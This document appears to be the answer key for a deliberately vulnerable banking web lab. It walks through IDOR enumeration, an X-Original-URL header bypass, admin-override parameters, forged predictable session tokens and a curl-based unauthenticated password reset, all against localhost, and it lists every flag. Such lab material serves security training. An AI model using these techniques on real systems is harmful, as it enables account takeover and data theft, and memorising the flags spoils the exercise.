# 🎯 Lab Challenges & Solutions

## Challenge 1: Horizontal Privilege Escalation
**Difficulty:** ⭐⭐☆☆☆ (Beginner)

**Scenario:**  
You are logged in as a regular user but want to access other users' account information.

**Questions to Answer:**
- Can you access another user's account details without their credentials?
- What URL parameter controls which user's data is displayed?
- How would you systematically enumerate all user accounts?
- What sensitive information can you extract from other users' profiles?

**Solutions:**

**Accessing Other Users' Accounts:**  
Log in as `jane_smith` (password: `password`). Navigate to `account.php?user_id=3`, then change the `user_id` parameter (e.g., `account.php?user_id=2`) to view `john_doe`'s account information.  
**URL Parameter:** The `user_id` parameter in the URL controls which user's data is displayed.

**Systematic Enumeration:**  
Try sequential user IDs:
- `account.php?user_id=1` (admin account)
- `account.php?user_id=2` (john_doe)
- `account.php?user_id=3` (jane_smith)
- `account.php?user_id=4` (bob_wilson)

**Sensitive Information Extracted:**  
- Full names and usernames
- Email addresses
- Account balances
- Account numbers
- Account types (premium/regular)

**Flag:**  
`FLAG{h0r1z0nt4l_pr1v_3sc4l4t10n_f0und}` (found in jane_smith's account notes)

---

## Challenge 2: Vertical Privilege Escalation
**Difficulty:** ⭐⭐⭐☆☆ (Intermediate)

**Scenario:**  
As a regular user, you've discovered an admin panel but are denied access. Find ways to bypass the authorization checks.

**Questions to Answer:**
- What HTTP response code do you receive when accessing the admin panel?
- Can you identify any HTTP headers that might bypass the restriction?
- Are there any URL parameters that could override the access control?
- What administrative functions become available after successful bypass?

**Solutions:**

**HTTP Response Code:**  
You receive a `403 Forbidden` when accessing `/admin.php` as a regular user.

**HTTP Header Bypass:**  
- Use the `X-Original-URL` header:
    ```
    GET / HTTP/1.1
    Host: localhost:8080
    X-Original-URL: /admin.php
    ```
- Or with curl:  
    `curl -H "X-Original-URL: /admin.php" http://localhost:8080/`

**URL Parameter Bypass:**  
Try `admin.php?admin_override=true` to bypass the simple authorization check.

**Administrative Functions Available:**  
- View all user accounts and details
- Access system statistics
- User management capabilities

**Flag:**  
`FLAG{v3rt1c4l_4cc3ss_c0ntr0l_byp4ss3d}`

---

## Challenge 3: Transaction IDOR Vulnerability
**Difficulty:** ⭐⭐☆☆☆ (Beginner-Intermediate)

**Scenario:**  
The banking system allows users to view transaction details, but the implementation may have flaws.

**Questions to Answer:**
- How are transaction IDs structured in the application?
- Can you view transactions that don't belong to your account?
- What happens when you try sequential transaction IDs?
- Are there any hidden or sensitive transactions you can discover?

**Solutions:**

**Transaction ID Structure:**  
Sequential numeric IDs starting from 12338.

**Viewing Others' Transactions:**  
Navigate to `transactions.php?id=12340` to see a transaction not belonging to your account.

**Sequential ID Testing:**  
Try these transaction IDs:
- `transactions.php?id=12338` (admin transaction)
- `transactions.php?id=12339` (regular transaction)
- `transactions.php?id=12340` (contains flag)
- `transactions.php?id=12341` (user transaction)
- `transactions.php?id=12342` (another transaction)

**Hidden Transactions:**  
Transaction ID 12340 contains sensitive information.

**Flag:**  
`FLAG{1d0r_tr4ns4ct10n_l34k4g3}` (found in transaction memo)

---

## Challenge 4: API Access Control Bypass
**Difficulty:** ⭐⭐⭐☆☆ (Intermediate)

**Scenario:**  
The application has API endpoints that may not properly validate user permissions.

**Questions to Answer:**
- What API endpoints are available in the application?
- Do the APIs properly validate user authentication?
- Can you access admin-only API functions as a regular user?
- What sensitive data can be extracted through API calls?

**Solutions:**

**Available API Endpoints:**  
- `/api/user-data.php` — User profile and account data  
- `/api/reset-password.php` — Password reset functionality

**API Authentication Testing:**  
Test with different actions:
- `/api/user-data.php?action=profile&user_id=1`
- `/api/user-data.php?action=accounts&user_id=2`
- `/api/user-data.php?action=admin_users`

**Admin API Access:**  
Bypass admin check with:  
`/api/user-data.php?action=admin_users&force=true`

**Sensitive Data Extraction:**  
- All user profiles and account information
- Session information and tokens
- Administrative user lists

**Flags:**  
- `FLAG{4p1_1d0r_vuln3r4b1l1ty}` (when accessing other users' data)
- `FLAG{4dm1n_4p1_byp4ss3d}` (when accessing admin functions)

---

## Challenge 5: Session Management Vulnerabilities
**Difficulty:** ⭐⭐⭐⭐☆ (Advanced)

**Scenario:**  
Investigate how the application manages user sessions and look for weaknesses.

**Questions to Answer:**
- How are session tokens generated and validated?
- Can you predict or forge session tokens?
- Is there a way to hijack another user's session?
- How does the application handle session expiration?

**Solutions:**

**Session Token Analysis:**  
Check `/api/user-data.php?action=session_info` to reveal predictable session tokens, such as `admin_YYYY-MM-DD`.

**Token Prediction:**  
Pattern: `admin_2025-06-14` (admin token for current date). Regular users have different patterns, but admin tokens are predictable.

**Session Hijacking:**  
- **Method 1:** Forge admin session token by setting a cookie with the predicted admin token (`admin_[current_date]`).
- **Method 2:** Use session information from the API to extract session details.

**Session Expiration:**  
No proper session timeout is implemented; sessions persist until browser closure.

**Flag:**  
`FLAG{s3ss10n_h1j4ck1ng_m4st3r}` (when successfully hijacking admin session)

---

## Challenge 6: Password Reset Vulnerability
**Difficulty:** ⭐⭐⭐☆☆ (Intermediate)

**Scenario:**  
The application has a password reset feature that may have security flaws.

**Questions to Answer:**
- What parameters are required for password reset requests?
- Can you reset another user's password without proper authorization?
- How are password reset tokens generated and validated?
- Is there any rate limiting on password reset attempts?

**Solutions:**

**Required Parameters:**  
Send a POST request to `/api/reset-password.php` with JSON:
```json
{
    "user_id": "2",
    "password": "newpass123"
}
```

**Unauthorized Password Reset:**  
You can reset any user's password by changing `user_id`:
```bash
curl -X POST http://localhost:8080/api/reset-password.php \
-H "Content-Type: application/json" \
-d '{"user_id":"1","password":"hacked123"}'
```

**Reset Token Generation:**  
Tokens are generated using `md5(user_id + current_date)`.  
Example: `md5("1" + "2025-06-14")` for admin user.

**Rate Limiting:**  
No rate limiting is implemented; unlimited reset attempts are allowed.

**Flag:**  
`FLAG{m1ss1ng_4uth_ch3ck_pwn3d}` (when successfully resetting another user's password)

---

## 🏆 Complete Flag Collection

| Challenge                      | Flag                                   | Location                        |
|---------------------------------|----------------------------------------|---------------------------------|
| Horizontal Privilege Escalation | FLAG{h0r1z0nt4l_pr1v_3sc4l4t10n_f0und} | jane_smith's account notes      |
| Vertical Privilege Escalation   | FLAG{v3rt1c4l_4cc3ss_c0ntr0l_byp4ss3d} | Admin panel access              |
| Transaction IDOR                | FLAG{1d0r_tr4ns4ct10n_l34k4g3}         | Transaction ID 12340 memo       |
| API IDOR                        | FLAG{4p1_1d0r_vuln3r4b1l1ty}           | API user data access            |
| API Admin Bypass                | FLAG{4dm1n_4p1_byp4ss3d}               | Admin API functions             |
| Session Hijacking               | FLAG{s3ss10n_h1j4ck1ng_m4st3r}         | Admin session manipulation      |
| Password Reset                  | FLAG{m1ss1ng_4uth_ch3ck_pwn3d}         | Unauthorized password reset     |
